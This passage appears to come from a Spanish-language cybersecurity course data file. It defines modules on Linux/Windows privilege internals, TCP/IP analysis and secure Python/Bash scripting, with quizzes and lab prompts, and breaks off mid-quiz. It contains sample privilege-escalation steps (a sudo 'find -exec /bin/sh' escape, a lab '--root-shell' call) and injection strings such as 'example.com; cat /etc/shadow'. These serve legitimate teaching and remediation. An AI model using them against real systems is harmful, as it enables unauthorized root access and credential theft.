        title: 'Linux Kernel Documentation — The /proc Filesystem & Virtual Memory',
        organization: 'The Linux Kernel Archives',
        url: 'https://docs.kernel.org/filesystems/proc.html',
        type: 'RFC / Documentación',
      },
    ],
    linkedLabId: 'lab-linux-privesc',
  },
  {
    id: 'mod-02',
    number: '02',
    title: 'Sistemas Operativos: Internals de Linux y Windows Server',
    tier: 'Fundamentos',
    domain: 'Linux & OS',
    estimatedHours: 12,
    summary:
      'Domina el modelo de permisos POSIX, bits especiales (SUID, SGID, Sticky Bit), Linux Capabilities, Namespaces/Cgroups, arquitectura Windows NT, Tokens de Acceso, LSASS y Active Directory.',
    objectives: [
      'Auditar permisos de archivos, bits SUID/SGID y Linux Capabilities para detectar vectores de escalada de privilegios.',
      'Comprender el flujo de autenticación en Linux (/etc/passwd, /etc/shadow, PAM) y en Windows (SAM, LSASS, NTLM y Kerberos).',
      'Aplicar el parcheo real de un binario SUID (`chmod u-s`) y comprobar que deja de otorgar EUID=0.',
    ],
    glossary: [
      {
        term: 'EUID (Effective UID)',
        definition: 'Identificador de usuario que el kernel evalúa realmente para decidir si un proceso tiene permiso sobre un recurso.',
      },
      {
        term: 'Bit SUID (4000)',
        definition: 'Permiso especial (`-rwsr-xr-x`) que hace que un binario se ejecute con el EUID del propietario del archivo (ej. root).',
      },
      {
        term: 'Linux Capabilities',
        definition: 'Permisos granulares almacenados en atributos extendidos (`getcap`) que otorgan poderes específicos de root sin usar el bit SUID.',
      },
      {
        term: 'LSASS',
        definition: 'Proceso crítico de Windows (`lsass.exe`) que valida inicios de sesión y custodia tickets Kerberos y hashes NTLM en RAM.',
      },
    ],
    predictionPrompt: {
      question: 'Predice antes de ejecutar: Si un binario `/usr/bin/python3.10` NO tiene el bit SUID (`-rwxr-xr-x`), pero tiene la capacidad extendida `cap_setuid+ep`, ¿aparecerá cuando busques con `find / -perm -4000`?',
      reveal: '¡No aparecerá! `find / -perm -4000` solo busca el bit SUID clásico en los permisos POSIX. Para descubrir capacidades extendidas debes usar específicamente `getcap -r / 2>/dev/null`.',
    },
    theorySections: [
      {
        heading: '1. Seguridad en Linux: UID Real vs. Efectivo (EUID), SUID y Capabilities',
        content:
          'En Linux, cada proceso posee un Real UID (quien lo lanzó) y un Effective UID (EUID, qué privilegios evalúa el kernel al acceder a recursos). Cuando un binario tiene el bit SUID activo (permiso octal 4000, visualizado como `-rwsr-xr-x`), el kernel asigna como EUID el identificador del propietario del archivo. Si el propietario es `root` y el binario permite ejecutar comandos externos o manipular archivos arbitrarios (como se documenta en GTFOBins), el atacante obtiene una shell con privilegios máximos. En cambio, las Linux Capabilities (`cap_setuid+ep`) residen en los atributos extendidos del inodo y solo son visibles con `getcap -r / 2>/dev/null`.',
        codeSnippet: `# Búsqueda de binarios con bit SUID activo y Capabilities de riesgo (2 escaneos distintos)
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null`,
      },
      {
        heading: '2. Internals de Windows: Procesos Críticos, Tokens de Acceso y LSASS',
        content:
          'En Windows NT, la autoridad de seguridad local (`lsass.exe`) valida credenciales, genera Access Tokens (que contienen los SIDs del usuario y sus privilegios como `SeDebugPrivilege` o `SeImpersonatePrivilege`) y mantiene en memoria tickets Kerberos y hashes NTLM. Por ello, proteger LSASS con Credential Guard (VBS) y RunAsPPL es indispensable en entornos empresariales.',
      },
    ],
    realWorldCase: {
      title: 'Escalada de Privilegios Local en sudo (Baron Samedit — CVE-2021-3156)',
      context:
        'Una vulnerabilidad de desbordamiento en el Heap dentro de `sudo` (presente durante casi 10 años en distribuciones Linux) permitía a cualquier usuario local obtener root sin estar autorizado en `/etc/sudoers`.',
      technicalRootCause:
        'Al invocar `sudoedit -s` con una barra invertida final mal escapada, el parser copiaba argumentos fuera de los límites del buffer con privilegios EUID=0 porque `sudo` es un binario SUID root.',
      lesson:
        'Minimizar los binarios SUID en servidores de producción (`chmod u-s`), utilizar Capabilities granulares y mantener parches de seguridad al día.',
    },
    diagramType: 'os-rings',
    diagramCaption:
      'Transición de privilegios mediante bit SUID / Capabilities en Linux y arquitectura de validación de Tokens en el Kernel.',
    activeRecallQuestions: [
      {
        id: 'ar-02-1',
        question: 'Durante una auditoría en un servidor Linux encuentras que `/usr/bin/python3.10` tiene asignada la capacidad `cap_setuid+ep`. ¿Cuál es el impacto real de seguridad?',
        options: [
          'Crítico: cualquier usuario local puede cambiar su UID a 0 (root) desde Python sin que el binario tenga el bit SUID tradicional.',
          'Ninguno, porque las capacidades solo aplican a tarjetas de red.',
          'Solo permite leer archivos dentro de `/tmp`.',
          'Requiere conocer primero la contraseña de root en `/etc/shadow`.',
        ],
        correctIndex: 0,
        explanation:
          'La capacidad `cap_setuid+ep` (Effective + Permitted) autoriza al binario a cambiar su propio UID a 0 (root) mediante la syscall `setuid(0)` sin necesidad de contraseña ni bit SUID.',
        commonMisconception:
          'Creer que si un binario no aparece en `find / -perm -4000` (SUID) no puede elevar privilegios, olvidando verificar `getcap -r /`.',
      },
      {
        id: 'ar-02-2',
        question: 'En Windows Server, ¿qué privilegio en el Token de una cuenta de servicio (como IIS o SQL Server) permite históricamente ataques de la familia Potato (GodPotato / PrintSpoofer) para escalar a NT AUTHORITY\\SYSTEM?',
        options: ['SeShutdownPrivilege', 'SeImpersonatePrivilege', 'SeChangeNotifyPrivilege', 'SeUndockPrivilege'],
        correctIndex: 1,
        explanation:
          '`SeImpersonatePrivilege` permite a un proceso suplantar el token de seguridad de un cliente que se conecte a él, permitiendo secuestrar un token de nivel SYSTEM.',
        commonMisconception: 'Ignorar los privilegios del token listados en `whoami /priv` cuando el usuario no es miembro del grupo Administradores.',
      },
      {
        id: 'ar-02-3',
        question: '¿Cuál de los siguientes comandos ELIMINA correctamente el bit SUID de `/usr/local/bin/sysdiag` dejándolo con permisos estándar `-rwxr-xr-x`?',
        options: [
          'chmod 4755 /usr/local/bin/sysdiag',
          'chmod u+s /usr/local/bin/sysdiag',
          'chmod u-s /usr/local/bin/sysdiag (o chmod 0755 /usr/local/bin/sysdiag)',
          'chown root:root /usr/local/bin/sysdiag',
        ],
        correctIndex: 2,
        explanation:
          '`chmod u-s` (o `chmod 0755`) revoca el bit SUID (`4000`). En cambio, `4755` o `u+s` activan/mantienen el bit SUID vulnerable.',
        commonMisconception: 'Escribir `chmod 4755` creyendo que quita el SUID, cuando el dígito inicial `4` precisamente activa el bit SUID.',
      },
      {
        id: 'ar-02-4',
        question: '¿Por qué el archivo `/etc/passwd` es legible por todos los usuarios en Linux mientras que `/etc/shadow` solo es legible por `root`?',
        options: [
          'Porque `/etc/passwd` está cifrado con AES-256.',
          'Porque `/etc/shadow` guarda los nombres de los comandos del sistema.',
          'Es un error de diseño de Linux sin función práctica.',
          'Porque herramientas como `ls` o `id` necesitan leer `/etc/passwd` para traducir números UID a nombres de usuario, mientras que los hashes de contraseñas se aíslan en `/etc/shadow`.',
        ],
        correctIndex: 3,
        explanation:
          'Separar los metadatos públicos de identidad (`/etc/passwd`) de los hashes de contraseñas (`/etc/shadow`) impide que usuarios no privilegiados descarguen hashes para crackearlos offline.',
        commonMisconception: 'Pensar que `/etc/passwd` sigue guardando las contraseñas en sistemas Linux modernos.',
      },
      {
        id: 'ar-02-5',
        question: 'Si ejecutas `sudo -l` como el usuario `auditor` y ves `(root) NOPASSWD: /usr/bin/find`, ¿por qué representa una vulnerabilidad crítica de escalada de privilegios?',
        options: [
          'Porque `find` cuenta con la bandera `-exec /bin/sh \\;` que ejecutará una shell interactiva como `root` sin pedir contraseña.',
          'Porque `find` borra automáticamente el disco duro.',
          'No tiene ningún riesgo porque `find` solo sirve para buscar nombres de archivos.',
          'Solo funciona si el servidor no tiene tarjeta de red.',
        ],
        correctIndex: 0,
        explanation:
          'Como se documenta en GTFOBins, permitir ejecutar binarios con capacidad de invocar subprocesos (como `find -exec`, `vim`, `awk` o `less`) bajo `sudo` otorga ejecución arbitraria de comandos como `root`.',
        commonMisconception: 'Confiar en que un comando de búsqueda o lectura no puede abrir una shell interactiva.',
      },
    ],
    transferScenarioQuestion: {
      id: 'tr-02-1',
      question: 'ESCENARIO DE TRANSFERENCIA: En un servidor de producción ejecutas `find / -perm -4000 2>/dev/null` y no encuentras ningún binario SUID extraño. Sin embargo, el servidor sigue sufriendo escaladas de privilegios locales a `root`. ¿Qué segundo comando de enumeración debes ejecutar y por qué?',
      options: [
        '`ls -l /tmp` porque todos los exploits viven únicamente en `/tmp`.',
        '`getcap -r / 2>/dev/null` porque un binario como `python3` o `tar` puede tener capacidades extendidas (`cap_setuid+ep` o `cap_dac_override+ep`) que no activan el bit SUID 4000.',
        '`ping 127.0.0.1` para reiniciar los permisos del kernel.',
        '`chmod 4755 /bin/bash` para cerrar la brecha.',
      ],
      correctIndex: 1,
      explanation:
        'Las Linux Capabilities se almacenan en los atributos extendidos (`security.capability`) y otorgan privilegios de superusuario sin encender el bit SUID tradicional, por lo que requieren `getcap -r / 2>/dev/null`.',
      commonMisconception: 'Confiar únicamente en `find -perm -4000` durante una auditoría de privilegios en Linux.',
    },
    selfExplanationPrompt: {
      question:
        'Explica por qué almacenar los hashes de contraseñas en `/etc/shadow` (legible solo por root) en lugar de `/etc/passwd` es fundamental, y cómo funciona la diferencia entre el Real UID y el Effective UID (EUID) cuando se ejecuta un binario con permiso SUID.',
      guidingSubQuestions: [
        '¿Por qué `/etc/passwd` necesita ser legible por todos los usuarios del sistema?',
        '¿Qué cambia en el proceso cuando un binario propiedad de `root` tiene activo el bit SUID (`4000`)?',
      ],
      keyTerms: ['shadow', 'euid', 'suid', 'root', 'permiso'],
      exemplarAnswer:
        'El archivo /etc/passwd debe ser legible por los procesos para traducir números UID a nombres de usuario, por lo que los hashes se protegen en /etc/shadow accesible solo por root. Cuando un usuario normal ejecuta un binario con el bit SUID activo propiedad de root, el kernel mantiene su Real UID pero eleva el Effective UID (EUID) a 0 (root), otorgándole permisos de superusuario durante esa ejecución.',
    },
    deliberatePractice: {
      prompt:
        'Enumera los binarios SUID con `find / -perm -4000 2>/dev/null`, obtén la bandera con `/usr/local/bin/sysdiag --root-shell` y luego revoca el bit SUID con `chmod u-s /usr/local/bin/sysdiag`.',
      scenario: 'Acabas de obtener acceso como usuario `auditor` en un servidor Ubuntu y debes auditar y corregir la escalada SUID.',
      starterCommandOrCode: 'find / -perm -4000 2>/dev/null',
      expectedPatterns: ['find /', '-perm', '4000', 'sysdiag', 'chmod'],
      hint: 'Usa `find / -perm -4000 2>/dev/null`, luego `/usr/local/bin/sysdiag --root-shell` y finalmente `chmod u-s /usr/local/bin/sysdiag`.',
      feedbackSuccess:
        'Excelente. Completaste la enumeración, la prueba de concepto y la remediación verificable del bit SUID.',
      feedbackError:
        'Asegúrate de usar `find / -perm -4000 2>/dev/null`, `/usr/local/bin/sysdiag --root-shell` o `chmod u-s /usr/local/bin/sysdiag`.',
    },
    knowledgeSummary: [
      'SUID (`4000`) ejecuta binarios con el EUID del dueño; las Linux Capabilities dividen el poder de root en privilegios específicos (`getcap -r /`).',
      'Para remediar un binario SUID innecesario se usa `chmod u-s <ruta>` (o `chmod 0755 <ruta>`), nunca `4755`.',
      'En Windows, `whoami /priv` revela privilegios explotables como `SeImpersonatePrivilege` y `SeDebugPrivilege`.',
    ],
    spanishVideos: [
      {
        title: 'GTFOBins — Catálogo Interactivo de Binarios Unix con Capacidades de Escalada (SUID / Sudo / Capabilities)',
        author: 'GTFOBins Official Project',
        duration: 'Catálogo Técnico',
        url: 'https://gtfobins.github.io/',
        focus: 'Referencia mundial para auditar qué binarios permiten elevar privilegios cuando tienen SUID, Sudo o Capabilities.',
      },
      {
        title: 'Linux Capabilities Manual — capabilities(7)',
        author: 'Linux man-pages Project',
        duration: 'Documentación Oficial',
        url: 'https://man7.org/linux/man-pages/man7/capabilities.7.html',
        focus: 'Explicación completa de conjuntos Effective, Permitted e Inheritable en el kernel Linux.',
      },
    ],
    officialDocs: [
      {
        title: 'GTFOBins — Curated list of Unix binaries that can bypass local security restrictions',
        organization: 'GTFOBins Project',
        url: 'https://gtfobins.github.io/',
        type: 'Guía Técnica',
      },
      {
        title: 'Linux Capabilities manual page — capabilities(7)',
        organization: 'Linux man-pages project',
        url: 'https://man7.org/linux/man-pages/man7/capabilities.7.html',
        type: 'RFC / Documentación',
      },
    ],
    linkedLabId: 'lab-linux-privesc',
  },
  {
    id: 'mod-03',
    number: '03',
    title: 'Redes Informáticas, TCP/IP y Análisis de Protocolos',
    tier: 'Fundamentos',
    domain: 'Redes',
    estimatedHours: 14,
    summary:
      'Analiza el tráfico de red a nivel de paquete: modelo OSI vs TCP/IP, direccionamiento CIDR, ARP, el saludo de 3 vías TCP (SYN, SYN-ACK, ACK), DNS, TLS 1.3 y disección profunda con Wireshark/tcpdump.',
    objectives: [
      'Inspeccionar cabeceras Ethernet, IPv4/IPv6, TCP y UDP para distinguir tráfico legítimo de escaneos y anomalías.',
      'Explicar por qué el protocolo ARP carece de autenticación nativa y cómo ocurre el ARP Spoofing en redes LAN.',
      'Realizar subneteos CIDR y reconstruir flujos de sesión mediante capturas PCAP con tcpdump y Wireshark.',
    ],
    glossary: [
      {
        term: 'Three-Way Handshake',
        definition: 'Saludo de tres pasos (`SYN` -> `SYN,ACK` -> `ACK`) con el que TCP sincroniza números de secuencia antes de transmitir datos.',
      },
      {
        term: 'CIDR (`/24`, `/26`)',
        definition: 'Notación que indica cuántos bits de los 32 de una dirección IPv4 corresponden a la red; el resto identifica a los hosts.',
      },
      {
        term: 'ARP',
        definition: 'Protocolo de Capa 2 que descubre la dirección física MAC asociada a una IPv4 en la red local.',
      },
      {
        term: 'DAI (Dynamic ARP Inspection)',
        definition: 'Defensa en switches empresariales que descarta respuestas ARP falsificadas validándolas contra la tabla DHCP Snooping.',
      },
    ],
    predictionPrompt: {
      question: 'Predice antes de ver el diagrama: Si envías un paquete `SYN` al puerto 8080 de un servidor y el puerto está ABIERTO, ¿con qué banderas TCP te responderá el servidor?',
      reveal: 'Te responderá con `[SYN, ACK]`. Si el puerto estuviera cerrado, respondería con `[RST, ACK]`; y si un firewall descartara el paquete en silencio, no recibirías respuesta (`filtered`).',
    },
    theorySections: [
      {
        heading: '1. Encapsulamiento, Modelo TCP/IP y Estados de Conexión TCP',
        content:
          'Cada comunicación en red atraviesa un proceso de encapsulamiento: Datos de Aplicación -> Segmento TCP/UDP (con puertos origen y destino) -> Paquete IP (direcciones lógicas y TTL) -> Trama Ethernet (direcciones físicas MAC). En TCP, la fiabilidad se logra mediante números de secuencia (SEQ), acuses de recibo (ACK) y banderas de control (`SYN`, `ACK`, `FIN`, `RST`, `PSH`, `URG`). Comprender estos flags explica la diferencia entre un escaneo completo (`nmap -sT`) y un escaneo sigiloso semiabierto (`nmap -sS` SYN Scan).',
        codeSnippet: `# Captura de paquetes TCP SYN y lectura de archivo PCAP con tcpdump
tcpdump -nn -i eth0 'tcp[tcpflags] & (tcp-syn) != 0' -c 20
tcpdump -nn -A -r captura_red.pcap`,
      },
      {
        heading: '2. Resolución ARP, DNS y Seguridad en el Transporte con TLS 1.3',
        content:
          'En Capa 2, ARP traduce direcciones IP a direcciones MAC mediante respuestas no autenticadas (`ARP Reply`), lo que permite ataques Man-in-the-Middle si el switch no implementa Dynamic ARP Inspection (DAI). En capas superiores, TLS 1.3 protege la confidencialidad e integridad eliminando algoritmos obsoletos e imponiendo Perfect Forward Secrecy (PFS) mediante intercambio efímero Diffie-Hellman (ECDHE).',
      },
    ],
    realWorldCase: {
      title: 'Intercepción de Credenciales en Texto Plano en Redes Internas No Cifradas',
      context:
        'Durante una auditoría interna en una entidad médica, el tráfico del portal web principal usaba HTTPS, pero un microservicio de administración en el puerto 8080 transmitía encabezados `Authorization: Bearer` sobre HTTP sin cifrar.',
      technicalRootCause:
        'Ausencia de cifrado TLS en comunicaciones internas ("East-West Traffic"), permitiendo que cualquier nodo comprometido en la misma subred capture tokens mediante sniffing pasivo.',
      lesson:
        'El modelo Zero Trust asume que la red interna ya es hostil; todo tráfico interno debe usar TLS mutuo (mTLS) o HTTPS estricto.',
    },
    diagramType: 'tcp-handshake',
    diagramCaption:
      'Comparativa entre el Three-Way Handshake TCP estándar y un escaneo de puertos SYN Half-Open (`nmap -sS`).',
    activeRecallQuestions: [
      {
        id: 'ar-03-1',
        question: 'Durante un escaneo `nmap -sS` (SYN Scan) hacia el puerto 445 de un servidor, el objetivo responde con un paquete `[SYN, ACK]`. ¿Qué paquete envía inmediatamente el escáner para no completar la conexión en la capa de aplicación?',
        options: ['Un paquete [ACK] con payload vacío', 'Un paquete [RST] (Reset)', 'Un paquete [FIN, PSH, URG]', 'Una solicitud ARP Request'],
        correctIndex: 1,
        explanation:
          'En un SYN Scan (`-sS`), al recibir `[SYN, ACK]` se confirma que el puerto está abierto (`open`) y el kernel/escáner envía inmediatamente un `[RST]` para cerrar la conexión antes de completar el handshake.',
        commonMisconception: 'Creer que el SYN Scan completa el saludo de 3 vías con un ACK final.',
      },
      {
        id: 'ar-03-2',
        question: '¿Cuántas direcciones IP utilizables para hosts existen en una subred `/26` (máscara `255.255.255.192`)?',
        options: ['64 direcciones utilizables', '30 direcciones utilizables', '62 direcciones utilizables', '126 direcciones utilizables'],
        correctIndex: 2,
        explanation:
          'En un `/26` quedan 6 bits para host ($2^6 = 64$ direcciones totales). Restando la dirección de red y la dirección de broadcast ($64 - 2$), quedan 62 direcciones utilizables.',
        commonMisconception: 'Olvidar restar las 2 direcciones reservadas (Red y Broadcast) al calcular $2^{(32 - \text{prefijo})}$.',
      },
      {
        id: 'ar-03-3',
        question: 'Si envías un segmento TCP `[SYN]` a un puerto y el servidor responde inmediatamente con `[RST, ACK]`, ¿en qué estado se encuentra ese puerto?',
        options: ['Filtered (Filtrado por firewall)', 'Open (Abierto)', 'Open|Filtered', 'Closed (Cerrado, no hay ningún proceso escuchando en ese puerto)'],
        correctIndex: 3,
        explanation:
          'Según el RFC 9293, cuando un host recibe un `SYN` hacia un puerto donde ningún socket está en estado `LISTEN`, la pila TCP/IP responde inmediatamente con `[RST, ACK]`.',
        commonMisconception: 'Confundir un puerto cerrado (`RST, ACK`) con un puerto filtrado por un firewall silencioso (sin respuesta / timeout).',
      },
      {
        id: 'ar-03-4',
        question: '¿Qué control de seguridad en switches gestionables de Capa 2 previene los ataques de ARP Spoofing / ARP Poisoning dentro de una VLAN?',
        options: [
          'Dynamic ARP Inspection (DAI) apoyado en la base de datos de DHCP Snooping.',
          'Cambiar el puerto HTTP de 80 a 8080.',
          'Desactivar el cifrado TLS 1.3.',
          'Aumentar el valor TTL de los paquetes IP.',
        ],
        correctIndex: 0,
        explanation:
          'DHCP Snooping registra qué dirección MAC tiene asignada legítimamente cada dirección IP en cada puerto del switch, y DAI descarta cualquier paquete ARP que intente falsificar esa relación.',
        commonMisconception: 'Pensar que un firewall perimetral de Capa 3/4 evita ataques ARP entre dos máquinas de la misma subred LAN.',
      },
      {
        id: 'ar-03-5',
        question: 'Al analizar una captura con `tcpdump -nn -A -r captura_red.pcap`, ¿para qué sirve específicamente la bandera `-nn`?',
        options: [
          'Para borrar los paquetes duplicados.',
          'Para no resolver direcciones IP a nombres DNS ni números de puerto a nombres de servicio, acelerando el análisis y mostrando los valores numéricos exactos.',
          'Para cifrar el archivo PCAP con una contraseña.',
          'Para enviar los paquetes de vuelta al atacante.',
        ],
        correctIndex: 1,
        explanation:
          'En análisis forense de red, `-nn` evita generar tráfico DNS adicional hacia el exterior y muestra con precisión las IPs y puertos numéricos.',
        commonMisconception: 'Omitir `-nn` al analizar capturas de incidentes, provocando consultas DNS lentas o alertando a dominios del atacante.',
      },
    ],
    transferScenarioQuestion: {
      id: 'tr-03-1',
      question: 'ESCENARIO DE TRANSFERENCIA: En una auditoría interna capturas tráfico en el puerto 8080 y observas en texto claro `Authorization: Bearer eyJ...`. El equipo de desarrollo propone cambiar el puerto 8080 por el puerto 59123 para "ocultar el tráfico". ¿Por qué esa medida es insuficiente y cuál es la solución correcta?',
      options: [
        'Es suficiente porque tcpdump solo captura puertos menores a 1024.',
        'Es insuficiente; un atacante en la red capturará el payload en cualquier puerto. La solución es cifrar el canal con TLS 1.3 / mTLS.',
        'La solución es codificar el token en Base64 dos veces sobre HTTP.',
        'La solución es cambiar TCP por UDP sin cifrado.',
      ],
      correctIndex: 1,
      explanation:
        'Cambiar de puerto es seguridad por oscuridad: cualquier sniffer o escaneo `nmap -p-` encontrará el nuevo puerto y leerá el texto plano. Solo el cifrado criptográfico (TLS 1.3 / mTLS) protege la confidencialidad e integridad en tránsito.',
      commonMisconception: 'Creer que usar un puerto no estándar oculta el contenido de los paquetes ante una captura PCAP.',
    },
    selfExplanationPrompt: {
      question:
        'Explica por qué un atacante en la misma red local (VLAN) puede interceptar el tráfico entre una estación de trabajo y el gateway mediante ARP Spoofing, y qué control en el switch mitiga este ataque de raíz.',
      guidingSubQuestions: [
        '¿Verifica el protocolo ARP si una respuesta `ARP Reply` corresponde a una solicitud previa?',
        '¿Cómo valida Dynamic ARP Inspection (DAI) junto con DHCP Snooping las tramas ARP?',
      ],
      keyTerms: ['arp', 'mac', 'cache', 'switch', 'dai'],
      exemplarAnswer:
        'El protocolo ARP es apátrida (stateless): cualquier host actualiza su tabla ARP caché cuando recibe un paquete ARP Reply, aunque no lo haya solicitado. Un atacante envía respuestas ARP falsificadas asociando su propia dirección MAC con la IP del gateway. Para mitigarlo de raíz, el switch debe activar DHCP Snooping y Dynamic ARP Inspection (DAI), que descarta cualquier paquete ARP cuya relación IP-MAC no coincida con la tabla legítima del switch.',
    },
    deliberatePractice: {
      prompt:
        'Escanea los servicios de `10.10.10.45` con `nmap -sV 10.10.10.45` y luego inspecciona la captura de red con `tcpdump -A -r captura_red.pcap`.',
      scenario: 'Necesitas identificar qué servicios escuchan en `10.10.10.45` y extraer el token transmitido en texto claro en `captura_red.pcap`.',
      starterCommandOrCode: 'tcpdump -A -r captura_red.pcap',
      expectedPatterns: ['nmap', '10.10.10.45', 'tcpdump', 'captura_red.pcap'],
      hint: 'Ejecuta `nmap -sV 10.10.10.45` y luego `tcpdump -A -r captura_red.pcap`.',
      feedbackSuccess:
        'Correcto. Has combinado el reconocimiento activo de versiones con la disección de paquetes PCAP.',
      feedbackError: 'Usa `nmap -sV 10.10.10.45` o `tcpdump -A -r captura_red.pcap`.',
    },
    knowledgeSummary: [
      'El saludo de 3 vías TCP utiliza `SYN` -> `SYN/ACK` -> `ACK`; un puerto cerrado responde con `RST/ACK`, mientras que un firewall silencioso no responde (estado `filtered`).',
      'ARP opera en Capa 2 sin autenticación; se protege en switches gestionables mediante DHCP Snooping + Dynamic ARP Inspection (DAI).',
      'El análisis de archivos `.pcap` con `tcpdump` y Wireshark es esencial tanto para auditorías ofensivas como para investigación forense de red.',
    ],
    spanishVideos: [
      {
        title: 'Nmap Official Reference Guide — Port Scanning Techniques',
        author: 'Gordon "Fyodor" Lyon (Nmap Project)',
        duration: 'Guía Oficial',
        url: 'https://nmap.org/book/man-port-scanning-techniques.html',
        focus: 'Documentación oficial de los estados de puertos y banderas `-sS`, `-sT`, `-sU` y `-sV`.',
      },
      {
        title: 'Wireshark User Guide — Packet Dissection & TCP Analysis',
        author: 'Wireshark Foundation',
        duration: 'Manual Técnico',
        url: 'https://www.wireshark.org/docs/wsug_html_chunked/',
        focus: 'Análisis profundo de flujos TCP, filtros de visualización y reconstrucción de sesiones.',
      },
    ],
    officialDocs: [
      {
        title: 'RFC 9293 — Transmission Control Protocol (TCP) Specification',
        organization: 'IETF (Internet Engineering Task Force)',
        url: 'https://datatracker.ietf.org/doc/html/rfc9293',
        type: 'RFC / Documentación',
      },
      {
        title: 'Nmap Network Scanning — Official Reference Guide',
        organization: 'Gordon "Fyodor" Lyon / Nmap Project',
        url: 'https://nmap.org/book/man.html',
        type: 'Guía Técnica',
      },
    ],
    linkedLabId: 'lab-network-recon',
  },
  {
    id: 'mod-04',
    number: '04',
    title: 'Programación y Automatización con Python y Bash',
    tier: 'Fundamentos',
    domain: 'Programación',
    estimatedHours: 15,
    summary:
      'Un profesional Senior no depende de herramientas prefabricadas: desarrolla sus propios scripts en Python y Bash para automatizar reconocimiento, analizar millones de líneas de logs, interactuar con sockets y construir exploits o detectores.',
    objectives: [
      'Escribir scripts robustos en Bash aplicando `set -euo pipefail`, tuberías POSIX, `awk`, `sed` y expresiones regulares.',
      'Desarrollar herramientas de seguridad en Python utilizando `socket`, `requests`, `hashlib`, `subprocess` seguro y concurrencia.',
      'Evitar vulnerabilidades de inyección de comandos al construir scripts de automatización (no usar `shell=True` con entradas no confiables).',
    ],
    glossary: [
      {
        term: 'set -euo pipefail',
        definition: 'Cabecera de Bash que aborta ante errores (-e), variables no definidas (-u) o fallos intermedios en tuberías (-o pipefail).',
      },
      {
        term: 'Command Injection',
        definition: 'Vulnerabilidad donde datos no confiables se concatenan en un comando de shell (`;`, `&&`, `|`), ejecutando órdenes arbitrarias.',
      },
      {
        term: 'execve()',
        definition: 'Llamada al sistema que ejecuta un binario directamente pasando un arreglo de argumentos sin invocar `/bin/sh`.',
      },
    ],
    predictionPrompt: {
      question: 'Predice antes de ver el código: Si un script Python ejecuta `subprocess.run(f"ping -c 1 {ip}", shell=True)` y alguien envía como IP `8.8.8.8; id`, ¿qué pasará?',
      reveal: 'El intérprete `/bin/sh` ejecutará primero el `ping` y, al ver el punto y coma `;`, ejecutará inmediatamente el comando `id` (o cualquier comando malicioso). Usando `subprocess.run(["ping", "-c", "1", ip], shell=False)` eso es imposible.',
    },
    theorySections: [
      {
        heading: '1. Bash Defensivo y Ofensivo: Tuberías, Descriptores y Parsing de Logs',
        content:
          'En sistemas Unix, la filosofía de combinar utilidades pequeñas mediante tuberías (`|`) permite procesar gigabytes de registros de auditoría en segundos. Todo script profesional debe iniciar con `set -euo pipefail`: `-e` detiene el script si un comando falla, `-u` impide usar variables no definidas y `-o pipefail` captura errores que ocurran en medio de una tubería.',
        codeSnippet: `#!/usr/bin/env bash
set -euo pipefail

# Extraer las IPs con más intentos fallidos de SSH en auth.log
grep "Failed password" auth.log \\
  | awk '{print $(NF-3)}' \\
  | sort | uniq -c | sort -nr`,
      },
      {
        heading: '2. Python para Ciberseguridad: Sockets Raw, Clientes HTTP y Subprocesos Seguros',
        content:
          'Python permite crear desde escáneres de puertos asíncronos hasta analizadores de integridad de archivos con SHA-256. Al invocar binarios del sistema desde Python mediante `subprocess.run()`, es crítico pasar los argumentos como una lista (`["nmap", "-sV", target_ip]`) con `shell=False` para impedir que caracteres como `;` o `&&` provoquen una inyección de comandos en tu propia herramienta.',
      },
    ],
    realWorldCase: {
      title: 'Vulnerabilidad de Command Injection en Scripts de Automatización DevSecOps',
      context:
        'Un equipo de seguridad creó un bot interno en Python que ejecutaba `os.system(f"whois {domain}")` recibiendo nombres de dominio desde un formulario web.',
      technicalRootCause:
        'Al pasar `example.com; cat /etc/shadow` al intérprete de comandos, el shell ejecutó ambos comandos secuencialmente.',
      lesson:
        'Nunca concatenar entradas externas en cadenas ejecutadas por un shell; utilizar `subprocess.run([cmd, arg], shell=False)` y validar con expresiones regulares estrictas.',
    },
    diagramType: 'python-automation',
    diagramCaption:
      'Pipeline de automatización en Python y Bash: ingesta de telemetría/sockets, procesamiento seguro y generación de alertas.',
    activeRecallQuestions: [
      {
        id: 'ar-04-1',
        question: 'En Python, ¿cuál es la forma segura de invocar un comando externo del sistema operativo recibiendo una dirección IP proporcionada por el usuario?',
        options: [
          'subprocess.run(["ping", "-c", "1", user_ip], shell=False, check=True)',
          'os.system("ping -c 1 " + user_ip)',
          'subprocess.Popen(f"ping -c 1 {user_ip}", shell=True)',
          'eval(f"ping({user_ip})")',
        ],
        correctIndex: 0,
        explanation:
          'Al pasar una lista de argumentos con `shell=False`, el sistema operativo ejecuta `execve()` directamente sobre el binario `/bin/ping` sin invocar `/bin/sh`, haciendo imposible que caracteres como `;` o `|` inyecten comandos adicionales.',
        commonMisconception: 'Usar `subprocess.run(..., shell=True)` creyendo que el módulo `subprocess` es seguro por sí solo sin importar el parámetro `shell`.',
      },
      {
        id: 'ar-04-2',
        question: '¿Qué problema soluciona específicamente la opción `set -o pipefail` en un script Bash de respuesta a incidentes?',
        options: [
          'Encripta automáticamente la salida estándar en disco.',
          'Hace que el código de salida de una tubería (`cmd1 | cmd2`) sea distinto de cero si cualquiera de los comandos de la cadena falla, no solo el último.',
          'Desactiva el firewall temporalmente.',
          'Ejecuta todos los comandos como usuario root.',
        ],
        correctIndex: 1,
        explanation:
          'Por defecto en Bash, el estado de salida de `cmd1 | cmd2` es únicamente el de `cmd2`. Con `set -o pipefail`, si `cmd1` falla, toda la tubería reporta el error inmediatamente.',
        commonMisconception: 'Asumir que `set -e` por sí solo detecta fallos en comandos situados a la izquierda de un pipe `|`.',
      },
      {
        id: 'ar-04-3',
        question: 'Al programar un escáner de puertos TCP con `socket` en Python, ¿qué ocurre si NO configuras `s.settimeout(2.0)` y te conectas a un puerto filtrado por un firewall que descarta paquetes (`DROP`)?',
        options: [
          'El script salta el puerto en 1 milisegundo.',
          'El socket lanza un Buffer Overflow.',
          'El hilo queda bloqueado esperando durante el timeout por defecto del sistema operativo (a menudo más de 60–120 segundos), paralizando el escáner.',
          'El firewall se apaga automáticamente.',
        ],
        correctIndex: 2,
        explanation:
          'Un firewall en modo `DROP` no devuelve `RST`, por lo que `connect()` o `connect_ex()` esperará indefinidamente las retransmisiones TCP a menos que definas un timeout explícito.',
        commonMisconception: 'Olvidar definir timeouts en clientes de red (`socket` o `requests.get(..., timeout=5)`).',
      },
      {
        id: 'ar-04-4',
        question: '¿Por qué es una mala práctica de ingeniería usar un bloque `except: pass` vacío en un script de seguridad en Python?',
        options: [
